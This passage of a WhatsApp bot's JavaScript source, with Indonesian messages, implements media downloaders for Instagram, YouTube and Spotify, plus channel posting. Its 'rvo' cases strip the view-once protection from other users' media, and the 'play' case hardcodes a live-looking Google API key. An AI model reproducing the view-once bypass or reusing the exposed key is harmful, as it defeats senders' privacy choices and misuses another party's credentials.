            if (!text) return m.reply("Masukkan URL Instagram!\nContoh: igdl2 https://www.instagram.com/p/xxx");
          
            try {
                const igdl = async (u) => {
                    let { data } = await axios.get(
                      `https://snapdownloader.com/tools/instagram-downloader/download?url=${u}`
                    );
                    let $ = cheerio.load(data);
                    const result = [];
                    $(".download-item").each((i, el) => {
                      const type = $(el).find(".type").text().trim().toLowerCase();
                      const url = $(el).find(".btn-download").attr("href");
                      if (url) result.push({ type, url });
                    });
                    return result;
                };
                await sock.sendMessage(m.chat, {
                    react: {
                      text: "⏳",
                      key: m.key
                    }
                });
                const res = await igdl(text);
                if (!res.length) return m.reply("Gagal mengambil media.");
                let linkList = res.map((v, i) => `${i + 1}. [${v.type}] ${v.url}`).join('\n');
                let caption = `Media Berhasil Di Unduh...\n\n`;
                for (let i = 0; i < res.length; i++) {
                    let media = res[i];
                    if (media.type === "video") {
                        await sock.sendMessage(m.chat, {
                            video: { url: media.url },
                            caption
                        }, { quoted: m });
                    } else if (media.type === "photo" || media.type === "image") {
                          await sock.sendMessage(m.chat, {
                              image: { url: media.url },
                              caption
                          }, { quoted: m });
                    }
                }
                await sock.sendMessage(m.chat, {
                  react: {
                    text: "✔️",
                    key: m.key
                  }
                });
            } catch (e) {
              m.reply("Gagal mengunduh media Instagram!\n\n" + e.message);
            }
        }
        break
        //════════════════════════════════//
        case 'capcut': case 'ccdl': {
            try {
                if (!args[0]) return m.reply(`*Example :* ${prefix + command} https://www.capcut.com/tv2/ZSDrUV5e8/`)
               
                let { data } = await axios.post('https://3bic.com/api/download', { url: args[0] }, {
                    headers: {
                      accept: 'application/json, text/plain, */*',
                      'content-type': 'application/json'
                    }
                })
               
                let base64url = data?.originalVideoUrl?.split('/api/cdn/')[1]
                let video = Buffer.from(base64url, 'base64').toString()
               
                await sock.sendMessage(m.chat, { video: { url: video } }, { quoted: m })
            } catch (e) {
                m.reply(e.message)
            }
        }
        break
        //════════════════════════════════//
        //PLAY CASE
        case 'yts': case 'ytsearch': case 'youtubesearch': {
    				if (!text) return m.reply(`Example: ${prefix + command} dj komang`)
    				await reaction(m.chat, "🔎")
    				try {
      					const res = await yts.search(text);
      					const hasil = pickRandom(res.all)
      					const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author?.name || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.seconds || 'Tidak tersedia'} second (${hasil.timestamp || 'Tidak tersedia'})\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
      					await reply({ image: { url: hasil.thumbnail }, caption: teksnya })
      			} catch (e) {
      					try {
        						const nvl = new NvlGroup();
        						let anu = await nvl.search(text);
        						let hasil = pickRandom(anu.videos)
        						let teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Upload At:* ${hasil.uploaded || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.duration || 'Tidak tersedia'}\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
        						await reply({ image: { url: hasil.thumbnail }, caption: teksnya })
      					} catch (e) {
        						try {
          							const res = await fetchApi('/search/youtube', { query: text });
          							const hasil = pickRandom(res.data)
          							const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.channelTitle || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.duration || 'Tidak tersedia'}\n*🔎Source:* https://youtu.be/${hasil.id || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
          							await reply({ image: { url: hasil.thumbMedium }, caption: teksnya })
        						} catch (e) {
        							  reply('Post not available!')
        						}
      					}
  				  }
			  }
			  break
			  //═══════════════════════════════════//
    	  case 'play': case 'ytplay': {
    		if (!text) return m.reply(`Masukkan judul video!\n\nContoh:\n.${command} lathi`);
    const youtube = google.youtube({
                version: 'v3',
                auth: 'AIzaSyA6rcAS8Nu5NK3Oqxk2biiWVjT0TMfmPwk',
            });
            const res = await youtube.search.list({
                part: 'snippet',
                q: text,
                type: 'video',
                maxResults: 1,
                order: 'relevance',
            });
    
            if (!res.data.items || res.data.items.length === 0) {
                return m.reply('❌ Tidak ada hasil yang ditemukan.');
            }
    
            const video = res.data.items[0];
            const videoId = video.id.videoId;
            const title = video.snippet.title;
            const channel = video.snippet.channelTitle;
            const publishedAt = new Date(video.snippet.publishedAt).toLocaleDateString();
            const thumbnail = video.snippet.thumbnails.high.url;
            const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
    
            const caption = `
🔎 *YOUTUBE MAGIC PLAYER*

📣 *JUDUL KONTEN:* _${title}_
🏷️ *CHANNEL KEREN:* _${channel}_
🗓️ *TANGGAL RILIS:* _${publishedAt}_

🎉 Pilih mode unduhan yang kamu suka:
🔊 *Audio Only* 🎧
🎥 *Full Video* 🎞️

👇 Pilih Format yang anda inginkan.
`.trim();
    
            const buttons = [{
                    buttonId: `.ytmp3 ${videoUrl}`,
                    buttonText: {
                        displayText: 'Audio 🎧'
                    },
                    type: 1
                },
                {
                    buttonId: `.ytmp4 ${videoUrl}`,
                    buttonText: {
                        displayText: 'Video 🎞️'
                    },
                    type: 1
                }
            ];
    
            await sock.sendMessage(m.chat, {
                image: {
                    url: thumbnail
                },
                caption,
                footer: global.footer,
                buttons,
                headerType: 4
            }, {
                quoted: m
            });
        }
        break
        //═══════════════════════════════════//
        case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
				
    				if (!text) return reply(`Example: ${prefix + command} url_youtube`)
    				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
    				await reaction(m.chat, "🔎")
    				try {
    					const api = `https://ndikz-api.vercel.app/download/ytmp3?url=${encodeURIComponent(text)}`;
            const {
                data
            } = await axios.get(api);
    
            if (!data?.status || !data?.download) {
                return m.reply("❌ Gagal mendapatkan data dari API.");
            }
    
            const title = data.title || "audio";
            const downloadURL = data.download;
    
            // 2. Setup path
            const tmpDir = path.resolve('./tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);
    
            const inputPath = path.join(tmpDir, `yt-${Date.now()}.raw`);
            const outputPath = path.join(tmpDir, `yt-${Date.now()}.mp3`);
    
            // 3. Download stream dari API ke file mentah
            const writer = fs.createWriteStream(inputPath);
            const response = await axios.get(downloadURL, {
                responseType: 'stream'
            });
            await new Promise((resolve, reject) => {
                response.data.pipe(writer);
                writer.on("finish", resolve);
                writer.on("error", reject);
            });
    
            // 4. Convert dengan ffmpeg
            await new Promise((resolve, reject) => {
                spawn("ffmpeg", ["-i", inputPath, "-vn", "-acodec", "libmp3lame", outputPath])
                    .on("error", reject)
                    .on("close", resolve);
            });
    
            // 5. Kirim hasilnya
            const buffer = fs.readFileSync(outputPath);
            await sock.sendMessage(m.chat, {
                audio: buffer,
                mimetype: "audio/mpeg",
                fileName: `${title}.mp3`
            }, {
                quoted: m
            });
    
            // 6. Cleanup
            fs.unlinkSync(inputPath);
            fs.unlinkSync(outputPath);
    				} catch (e) {
    					reply("Sorry Mang eror")
    			  }
  		  }
  			break
  			//═══════════════════════════════════//
  			case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
  				
    				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`)
    				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
    				await reaction(m.chat, "🔎")
    				try {
    					const api = `https://ndikz-api.vercel.app/download/ytmp4?url=${encodeURIComponent(text)}`;
            const {
                data
            } = await axios.get(api);
    
            if (!data.status || !data.download) return m.reply("❌ Gagal mengambil video.");
    
            const videoUrl = data.download;
            const tmpDir = path.resolve('./tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, {
                recursive: true
            });
    
            const outputPath = path.join(tmpDir, `yt-${Date.now()}.mp4`);
            const response = await axios.get(videoUrl, {
                responseType: 'stream'
            });
            const writer = fs.createWriteStream(outputPath);
    
            await new Promise((resolve, reject) => {
                response.data.pipe(writer);
                writer.on("finish", resolve);
                writer.on("error", reject);
            });
    
            const buffer = fs.readFileSync(outputPath);
    
            await sock.sendMessage(m.chat, {
                video: buffer,
                caption: `🎬 *${data.title}*`,
                fileName: `${data.title}.mp4`,
                mimetype: "video/mp4"
            }, {
                quoted: m
            });
    
            fs.unlinkSync(outputPath);
    				} catch (e) {
    				    m.reply("Maaf Mang eror")
    				}
  			}
  			break
        //═════════════════════════════════════//
        case "playch": {
             if (!isOwner) return;
             if (!text) return reply(`❌ ☇ Format:\n${prefix + command} judul lagu|idch@newsletter`)
          
             await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })
          
             try {
                // 🔹 parsing input
                  let [query, chId] = text.split("|").map(v => v?.trim())
                  if (!query) return reply("❌ Judul lagu tidak boleh kosong.")
            
                  // 🔹 default channel jika tidak diisi
                  const CHANNEL_ID = chId && chId.endsWith("@newsletter")
                     ? chId
                     : "120363422782684025@newsletter"
            
                  const apiRes = await fetch(
                     `https://api.deline.web.id/downloader/ytplay?q=${encodeURIComponent(query)}`
                  )
                  const apiJson = await apiRes.json()
            
                  if (!apiJson.status || !apiJson.result) {
                     await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
                     return reply("❌ Lagu tidak ditemukan.")
                  }
            
                  const result = apiJson.result
            
                  const tmpDir = path.join(process.cwd(), "tmp")
                  if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true })
            
                  const id = Date.now()
                  const tmpInput = path.join(tmpDir, `in_${id}.mp3`)
                  const tmpOutput = path.join(tmpDir, `out_${id}.ogg`)
            
                  const res = await fetch(result.dlink)
                  const buffer = Buffer.from(await res.arrayBuffer())
                  fs.writeFileSync(tmpInput, buffer)
            
                  await new Promise((resolve, reject) => {
                       ffmpeg(tmpInput)
                          .toFormat("ogg")
                          .audioCodec("libopus")
                          .on("end", resolve)
                          .on("error", reject)
                          .save(tmpOutput)
                  })
            
                  const audioBuffer = fs.readFileSync(tmpOutput)
            
                  // 🔹 kirim ke CHANNEL yang ditentukan user
                  await sock.sendMessage(CHANNEL_ID, {
                       audio: audioBuffer,
                       mimetype: "audio/ogg; codecs=opus",
                       ptt: true,
                       contextInfo: {
                          externalAdReply: {
                             title: result.title,
                             body: `Quality: ${result.pick.quality} • Size: ${result.pick.size}`,
                             thumbnailUrl: result.thumbnail,
                             sourceUrl: result.url,
                             mediaType: 1,
                             renderLargerThumbnail: false
                          }
                       }
                  })
            
                  await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
            
                  fs.existsSync(tmpInput) && fs.unlinkSync(tmpInput)
                  fs.existsSync(tmpOutput) && fs.unlinkSync(tmpOutput)
          
             } catch (e) {
                console.error("PLAYCH ERROR:", e)
                await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
                return reply("❌ Terjadi kesalahan.")
             }
        }
        break
        //═══════════════════════════════════//
        case "upch": {
             if (!isOwner) return;
             if (!text) return reply(`❌ ☇ Format:\n${prefix + command} idch@newsletter`)
             if (!m.quoted) return reply("❌ Harus reply pesan yang mau diupload ke channel.")
          
             const chId = text.trim()
             if (!chId.endsWith("@newsletter"))
                return reply("❌ ID channel tidak valid.\nContoh: 120363xxxx@newsletter")
          
             try {
                  await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })
            
                  const q = m.quoted
                  let msg = {}
            
                  // 📝 TEXT
                  if (q.text) {
                     msg = { text: q.text }
                  }
            
                  // 🖼️ IMAGE
                  else if (q.mtype === "imageMessage") {
                     const img = await q.download()
                     msg = {
                        image: img,
                        caption: q.text || "",
                        contextInfo: {
                            externalAdReply: {
                               title: global.dev,
                               body: `${global.footer}`,
                               thumbnailUrl: global.thumb,
                               sourceUrl: global.linkSaluran,
                               mediaType: 1,
                               renderLargerThumbnail: false
                            }
                        }
                     }
                  }
            
                  // 🎥 VIDEO
                  else if (q.mtype === "videoMessage") {
                     const vid = await q.download()
                     msg = {
                        video: vid,
                        caption: q.text || "",
                        contextInfo: {
                            externalAdReply: {
                               title: global.dev,
                               body: `${global.footer}`,
                               thumbnailUrl: global.thumb,
                               sourceUrl: global.linkSaluran,
                               mediaType: 1,
                               renderLargerThumbnail: false
                            }
                        }
                     }
                  }
            
                  // 🎧 AUDIO
                  else if (q.mtype === "audioMessage") {
                     const aud = await q.download()
                     msg = {
                        audio: aud,
                        mimetype: "audio/ogg; codecs=opus",
                        ptt: q.ptt || true,
                        contextInfo: {
                            externalAdReply: {
                               title: global.dev,
                               body: `${global.footer}`,
                               thumbnailUrl: global.thumb,
                               sourceUrl: global.linkSaluran,
                               mediaType: 1,
                               renderLargerThumbnail: false
                            }
                        }
                     }
                  }
            
                  // 📄 DOCUMENT
                  else if (q.mtype === "documentMessage") {
                     const doc = await q.download()
                     msg = {
                        document: doc,
                        mimetype: q.mimetype,
                        fileName: q.fileName || "file"
                     }
                  }
            
                  else {
                     return reply("❌ Tipe pesan tidak didukung.")
                  }
            
                  await sock.sendMessage(chId, msg)
            
                  await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
                  reply("✅ Berhasil diupload ke channel.")
          
             } catch (e) {
                console.error("UPCH ERROR:", e)
                await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
                reply("❌ Gagal upload ke channel.")
             }
        }
        break
        //═══════════════════════════════════//
        case 'play2': {
            if (!text) return reply(example("dj tiktok"))
            await sock.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
            let ytsSearch = await yts(text)
            const res = await ytsSearch.all[0]
            
            var anu = await ytmp3(res.url)
            if (anu.audio) {
                let urlMp3 = anu.audio
                await sock.sendMessage(m.chat, {
                    audio: {url: urlMp3}, 
                    mimetype: "audio/mpeg", 
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran 
                        },
                        externalAdReply: {  
                            title: `${global.dev} — Assistant`,
                            body: `${global.footer}`,
                            thumbnailUrl: global.thumb,
                            sourceUrl: global.linkSaluran, 
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {quoted: m})
            } else {
            return reply("Error! vidio atau lagu tidak ditemukan")
            }
        }
        break
        //═════════════════════════════════════//
        case 'yts2': {
            if (typeof text !== "string" || !text.trim()) {
                return reply(`Example: ${prefix + command} Night Changes`);
            }
            reply('_*🔎 Diproses..*_');
            fetch(`https://api.vreden.my.id/api/v1/download/play/audio?query=${encodeURIComponent(text)}`)
            .then(res => res.json())
            .then(response => {
                let results = response?.result?.results;
                if (!Array.isArray(results) || results.length === 0) {
                    return reply('Tidak ditemukan hasil untuk pencarian ini.');
                }
                let result = results[Math.floor(Math.random() * results.length)];
                if (!result.url) {
                    return reply('Terjadi kesalahan dalam mendapatkan URL.');
                }
                let captioon = `
🔗 *Url :* ${result.url}
\`- Title :\` ${result.title}
\`- Description :\`
_${result.description}_
\`- Duration :\` ${result.duration?.timestamp}`
        
                sock.sendMessage(m.key.remoteJid, {
                    image: { url: result.thumbnail },
                    caption: captioon,
                    footer: "Select Download Type",
                    buttons: [
                        {
                          buttonId: `${prefix}ytmp3 ${result.url}`,
                          buttonText: {
                              displayText: 'Audio'
                          },
                          type: 1
                        },
                        {
                          buttonId: `${prefix}ytmp4 ${result.url}`,
                          buttonText: {
                              displayText: 'Video'
                          },
                          type: 1
                        }
                    ],
                    headerType: 1,
                    viewOnce: true
                }, { quoted: m })
            })
            .catch(err => {
              console.error(err);
              reply('Terjadi Kesalahan dalam pencarian.');
            });
        }
        break
        //═════════════════════════════════════//
        case 'ytmp3-2': case 'ytaudio': {
             if (!text) return Reply('Masukkan judul lagu yang ingin dicari!');
             try {
                 await sock.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
                 let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(text)}&apikey=kayzuMD&format=mp3`;
                 let { data } = await axios.get(apiUrl, { timeout: 15000 });
                 if (!data || !data.data || !data.data.response) {
                     return m.reply('Gagal menemukan lagu.');
                 }
                 let song = data.data.response;
                 let caption = `🎵 *Judul:* ${song.title}\n`
                 + `✅ *Download:* Done`;
                 const videoId = song.videoUrl.includes('v=') ? song.videoUrl.split('v=')[1].split('&')[0] : null;
                 const thumbnailUrl = videoId ? `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg` : null;
                 await sock.sendMessage(m.chat, {
                     text: caption,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: song.title,
                             body: `Music Player`,
                             mediaType: 1,
                             thumbnailUrl: thumbnailUrl,
                             sourceUrl: song.videoUrl
                         }
                     }
                 }, { quoted: m });
                 const sanitizedTitle = song.title.replace(/[^\w\s-]/gi, '_').substring(0, 50);
                 let audioPath = path.join(__dirname, `temp_${Date.now()}_${sanitizedTitle}.mp3`);
                 try {
                 const response = await axios({
                     method: 'get',
                     url: song.download,
                     responseType: 'arraybuffer',
                     timeout: 60000,
                     headers: {
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                     }
                 });
                 if (!response.data || response.data.length === 0) {
                     throw new Error('Empty response data');
                 }
                 fs.writeFileSync(audioPath, Buffer.from(response.data));
                 try {
                     await sock.sendMessage(m.chat, {
                         audio: fs.readFileSync(audioPath),
                         mimetype: 'audio/mpeg',
                         fileName: `${sanitizedTitle}.mp3`,
                     }, { quoted: m });
                 } catch (audioSendError) {
                     await sock.sendMessage(m.chat, {
                         document: fs.readFileSync(audioPath),
                         mimetype: 'audio/mpeg',
                         fileName: `${sanitizedTitle}.mp3`,
                     }, { quoted: m });
                 }
                 if (fs.existsSync(audioPath)) {
                     fs.unlinkSync(audioPath);
                 }
                 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
                 } catch (downloadError) {
                     try {
                         const alternativeUrl = `https://api.akuari.my.id/downloader/youtube?link=${song.videoUrl}`;
                         const altResponse = await axios.get(alternativeUrl);
                         if (altResponse.data && altResponse.data.mp3) {
                             const audioResponse = await axios({
                                 method: 'get',
                                 url: altResponse.data.mp3,
                                 responseType: 'arraybuffer',
                                 timeout: 60000
                             });
                             audioPath = path.join(__dirname, `temp_alt_${Date.now()}_${sanitizedTitle}.mp3`);
                             fs.writeFileSync(audioPath, Buffer.from(audioResponse.data));
                             await sock.sendMessage(m.chat, {
                                 document: fs.readFileSync(audioPath),
                                 mimetype: 'audio/mpeg',
                                 fileName: `${sanitizedTitle}.mp3`,
                             }, { quoted: m });
                            
                             if (fs.existsSync(audioPath)) {
                                 fs.unlinkSync(audioPath);
                             }
                             await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
                         } else {
                         throw new Error('Alternative API failed');
                         }
                     } catch (altError) {
                     if (fs.existsSync(audioPath)) {
                     fs.unlinkSync(audioPath);
                     }
                     reply('Gagal mengunduh audio. Coba lagi nanti.');
                     await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                     }
                 }
             } catch (error) {
                 reply('Terjadi kesalahan saat mencari atau memproses lagu.');
                 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
             }
        }
        break
        //═════════════════════════════════════//
        case "ytmp4-2": {
            if (!text) return m.reply(example("linknya"))
            if (!text.startsWith("http")) return m.reply("❌ Link tidak valid!")
            await sock.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })
        
            try {
                // Fetch API Video
                let anu = await fetchJson(`https://ndikz-api.vercel.app/download/ytmp4?url=${encodeURIComponent(text)}`)
        
                if (!anu || !anu.status || !anu.result || !anu.result.download) {
                    return m.reply("⚠️ Error! Video tidak ditemukan.")
                }
        
                let meta = anu.result.metadata
                let down = anu.result.download
        
                // Kirim Thumbnail + Info Video
                await sock.sendMessage(
                    m.chat,
                    {
                        image: { url: meta.image },
                        caption: `🎬 *YOUTUBE MP4*\n\n📌 *Title:* ${meta.title}\n👤 *Author:* ${meta.author?.name || "Unknown"}\n⏱️ *Duration:* ${meta.duration?.timestamp || "?"}\n👁️ *Views:* ${meta.views || "?"}\n📅 *Uploaded:* ${meta.ago || "?"}\n\n🔗 [YouTube](${meta.url})`
                    },
                    { quoted: m }
                )
        
                // Kirim Video
                await sock.sendMessage(
                    m.chat,
                    {
                        video: { url: down.url },
                        mimetype: "video/mp4",
                        fileName: down.filename || "video.mp4"
                    },
                    { quoted: m }
                )
        
            } catch (e) {
                console.error(e)
                m.reply("⚠️ Terjadi error saat memproses video.")
            }
        
            await sock.sendMessage(m.chat, { 
            react: { text: '', key: m.key } })
        }
        break
        //═════════════════════════════════════//
        // CASE DOWNLOAD =========================
        case "spotify": case "splay": case "spotifysearch": {
            if (!text) return reply(`Example:\n${prefix + command} alan walker faded`);
          
            try {
                await sock.sendMessage(m.chat, {
                    react: { text: "🔍", key: m.key }
                });
        
                const apiUrl = `https://api.vreden.my.id/api/v1/search/spotify?query=${encodeURIComponent(q)}&limit=5`;
                const res = await fetch(apiUrl);
                const data = await res.json();
        
                if (!data.status || !data.result?.search_data?.length) {
                    return m.reply("❌ Lagu tidak ditemukan.");
                }
        
                const results = data.result.search_data.slice(0, 5);
        
                // =====================
                // BUILD SECTIONS
                // =====================
                const sections = [
                    {
                        title: "🎵 Spotify Music List",
                        rows: results.map((track, i) => ({
                            title: track.title,
                            description: `${track.artist} • ${track.duration}`,
                            id: `${prefix}spotifydown ${track.song_link}`
                        }))
                    }
                ];
        
                const caption = `
🎧 *SPOTIFY MUSIC DOWNLOADER*
    
🔎 *Query:* ${text}
📦 *Total Result:* ${results.length}
🎶 *Source:* Spotify
🎚️ *Quality:* High Quality
    
🇮🇩 Pilih lagu untuk langsung download  
🇺🇸 Select a song to download
    
`;
      
                // =====================
                // SEND INTERACTIVE MESSAGE
                // =====================
                const buttonMessage = {
                    text: caption,
                    footer: "👇 *Tap button below*",
                    contextInfo: {
                      externalAdReply: {
                         title: global.dev,
                         body: `${global.footer}`,
                         thumbnailUrl: global.thumb,
                         sourceUrl: global.linkSaluran,
                         mediaType: 1,
                         renderLargerThumbnail: false
                      },
                    },
                    buttons: [
                        {
                            buttonId: '.',
                            buttonText: { displayText: 'Powered Spotify' },
                            type: 4,
                            nativeFlowInfo: {
                                name: 'single_select',
                                paramsJson: JSON.stringify({
                                    title: "🎶 Select Music",
                                    sections
                                })
                            },
                            viewOnce: true
                        }
                    ]
                }
                await sock.sendMessage(m.chat, 
                    buttonMessage, { quoted: m })
            } catch (err) {
                console.error(err);
                m.reply("❌ Terjadi error saat mencari lagu Spotify.");
            }
        }
        break;
        //═══════════════════════════════════//
        case "spotifydown": {
            try {
                if (!args[0]) {
                  return m.reply("URL Spotify tidak valid!");
                }
                
                let url = args[0];
                
                await sock.sendMessage(m.chat, { react: { text: "⬇️", key: m.key } });
                
                m.reply("Downloading from Spotify...\n\nMohon tunggu...");
        
                let apiUrl = `https://api.vreden.my.id/api/v1/download/spotify?url=${encodeURIComponent(url)}`;
                let response = await fetch(apiUrl);
                
                const contentType = response.headers.get("content-type");
                if (!contentType || !contentType.includes("application/json")) {
                  throw new Error("API mengembalikan response HTML/bukan JSON. Kemungkinan API sedang maintenance atau rate limit.");
                }
                
                let data = await response.json();
                
                // Cek error dari API
                if (!data.status) {
                    let errorMsg = data.message || data.error || "Unknown error";
                    return m.reply(`Gagal mendapatkan link download!\n\nError dari API: ${errorMsg}\n\nKemungkinan penyebab:\n1. Link Spotify tidak valid\n2. API sedang maintenance\n3. Rate limit tercapai\n\nCoba lagi beberapa saat.`);
                }
                
                if (!data.result) {
                    return m.reply("Gagal mendapatkan data dari API!\n\nCoba lagi nanti.");
                }
                
                let track = data.result;
                
                if (!track.download) {
                    return m.reply("Link download tidak tersedia!\n\nCoba link Spotify yang lain atau coba lagi nanti.");
                }
                
                let audioResponse = await fetch(track.download);
                
                if (!audioResponse.ok) {
                  throw new Error(`Gagal mendownload audio: ${audioResponse.statusText}`);
                }
                
                let audioBuffer = await audioResponse.buffer();
                
                if (!audioBuffer || audioBuffer.length === 0) {
                  throw new Error("Audio buffer kosong atau tidak valid");
                }
                
                let durationSec = Math.floor((track.duration_ms || 0) / 1000);
                let minutes = Math.floor(durationSec / 60);
                let seconds = durationSec % 60;
                let durationFormatted = `${minutes}:${seconds.toString().padStart(2, '0')}`;
                
                let captionnya = `*Spotify Download Success*
          
▧ Title: *${track.title || "Unknown"}*
▧ Artist: *${track.artists || "Unknown Artist"}*
▧ Album: *${track.album || "Unknown Album"}*
▧ Duration: *${durationFormatted}*
▧ Release Date: *${track.release_date || "Unknown"}*
▧ Quality: *High Quality*
▧ Format: *MP3*

_Sending audio file..._`;
          
                await sock.sendMessage(m.chat, {
                    image: { url: track.cover_url },
                    caption: captionnya
                });
                
                const qkontak = {
                    "key": {
                        "participant": '0@s.whatsapp.net',
                        "remoteJid": "status@broadcast",
                        "fromMe": false,
                        "id": "Halo"
                    },
                    "message": {
                        "locationMessage": {
                          "name": `${track.artists}\n${track.title}`,
                          "jpegThumbnail": ''
                        }
                    }
                }
                
                await sock.sendMessage(m.chat, {
                  audio: audioBuffer,
                  mimetype: 'audio/mpeg',
                  fileName: `${track.title} - ${track.artists}.mp3`,
                  ptt: false
                }, { quoted: qkontak });
            
                await sock.sendMessage(m.chat, {
                  audio: audioBuffer,
                  mimetype: 'audio/ogg; codecs=opus',
                  ptt: true,
                  fileName: `${track.title} - ${track.artists}.ogg`
                }, { quoted: qkontak });
                  
                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
              
           
            } catch (error) {
                console.error("Error in spotify download:", error);
                await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                
                let errorMessage = error.message;
                
                if (errorMessage.includes("HTML") || errorMessage.includes("DOCTYPE")) {
                  errorMessage = "API mengembalikan response HTML (bukan JSON). API mungkin sedang maintenance atau down.";
                } else if (errorMessage.includes("invalid json")) {
                  errorMessage = "Response dari API tidak valid (bukan JSON). Coba lagi nanti.";
                } else if (errorMessage.includes("Download url tidak tersedia")) {
                  errorMessage = "Link download tidak tersedia saat proses convert. Coba link lain atau tunggu beberapa saat.";
                }
                
                m.reply(`Gagal mendownload lagu!\n\nError: ${errorMessage}\n\nSolusi:\n1. Pastikan link Spotify valid (link track, bukan playlist/album)\n2. Tunggu beberapa menit lalu coba lagi\n3. Coba link Spotify yang lain\n4. Cek apakah API vreden.my.id sedang online`);
            }
        }
        break;
        //═══════════════════════════════════//
        case 'txt2img': {
            if (!text) return reply("*Sertakan Deskripsi Gambar atau Prompt*")
            reply(".. _*Creating Image 🌀*_")
            sock.sendMessage(m.chat, {image: { url: `https://api.siputzx.my.id/api/ai/magicstudio?prompt=${encodeURIComponent(text)}`}, caption: `*Hasil Dari :*\n${text}`}, { quoted: contactQ })
        }
        break
        //════════════════════════════════════//
        case "rvo":
        case "view":
        case 'readviewonce': {
            if (!m.quoted) return reply(
            `${noticenya}\nReply ViewOnce with caption ${prefix + command}`);
            try {
                let buffer = await m.quoted.download();
                let type = m.quoted.mtype;
                let sendOptions = { quoted: m };
                if (type === "videoMessage") {
                    await sock.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
                } else if (type === "imageMessage") {
                    await sock.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
                } else if (type === "audioMessage") {
                    await sock.sendMessage(m.chat, { 
                        audio: buffer, 
                        mimetype: "audio/mpeg", 
                        ptt: m.quoted.ptt || false 
                    }, sendOptions);
                } else {
                    return reply("❌ Media View Once tidak didukung.");
                }
                await reaction(m.chat, "✅️")
            } catch (err) {
                console.error(err)}
        }
        break;
        //═════════════════════════════════════//
        case "rvo2": case "readviewonce2": case 'view2': {
            if (!m.quoted) return reply("dengan reply pesannya")
            let msg = m.quoted.message
            let type = Object.keys(msg)[0]
            if (!msg[type].viewOnce) return reply("Pesan itu bukan viewonce!")
            let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
            let buffer = Buffer.from([])
            for await (const chunk of media) {
                buffer = Buffer.concat([buffer, chunk])
            }
            if (/video/.test(type)) {
                return sock.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
            } else if (/image/.test(type)) {
                return sock.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
            } else if (/audio/.test(type)) {
                return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
            } 
        }
        break
        //═══════════════════════════════════//
        case 'torvo': { 
             if (!m.quoted) return reply(`send/reply image nya.`)
                
             if (/image/.test(mime)) {
                  let anu = await sock.downloadAndSaveMediaMessage(quoted)
                  sock.sendMessage(m.chat, {
                  image: {url: anu}, viewOnce : true}, { quoted: m })
             } else if (/video/.test(mime)) {
                  anu = await sock.downloadAndSaveMediaMessage(quoted)
                  sock.sendMessage(m.chat, {
                  video: {url: anu}, viewOnce : true}, { quoted: m })
             }
        }
        break
        //═════════════════════════════════//
        case 'send-vo': {
            try {
                if (!isOwner) return;
                if (!text) {
                    return reply(`Contoh penggunaan:\n${prefix + command} 628xxx`);
                }
        
                // Format nomor target
                let nomor = text.replace(/[^0-9]/g, '');
